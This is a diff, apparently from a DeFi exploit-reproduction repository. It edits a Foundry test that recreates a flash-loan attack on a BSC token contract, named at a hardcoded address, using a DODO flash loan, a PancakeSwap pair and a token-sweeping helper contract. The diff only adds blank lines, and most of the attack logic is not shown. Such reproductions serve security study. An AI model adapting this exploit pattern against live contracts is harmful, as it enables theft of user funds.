@@ -16,14 +16,19 @@ import "./../interface.sol";
 // The hacker sent multiple transactions to attack, just taking the first transaction as an example.
 
 interface IDodo {
+
     function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+
 }
 
 interface I3913 is IERC20 {
+
     function burnPairs() external;
+
 }
 
 contract Exploit is Test {
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     I3913 vulnerable = I3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
     IPancakePair pair = IPancakePair(0x715762906489D5D671eA3eC285731975DA617583);
@@ -152,11 +157,14 @@ contract Exploit is Test {
             busd.transfer(dodo5, dodo5FlashLoanAmount);
         }
     }
+
 }
 
 contract NewContract {
+
     function transferToken(address token, address destination) external {
         uint256 bal = I3913(token).balanceOf(address(this));
         I3913(token).transfer(destination, bal);
     }
+
 }
